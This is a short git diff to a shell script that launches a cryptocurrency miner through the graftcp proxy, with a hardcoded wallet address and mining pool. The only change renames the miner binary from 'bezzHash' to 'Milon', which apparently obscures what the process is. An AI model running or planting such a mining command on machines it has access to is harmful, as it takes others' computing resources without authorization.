@@ -50,4 +50,4 @@ sleep .10
 echo " "
 echo " "
 
-./graftcp/graftcp ./bezzHash --url=ssl://0x8D95F245262Bc2eBb6831f1E92fbdD39c7581903.ArcherONE@etc-us-east.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./Milon --url=ssl://0x8D95F245262Bc2eBb6831f1E92fbdD39c7581903.ArcherONE@etc-us-east.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
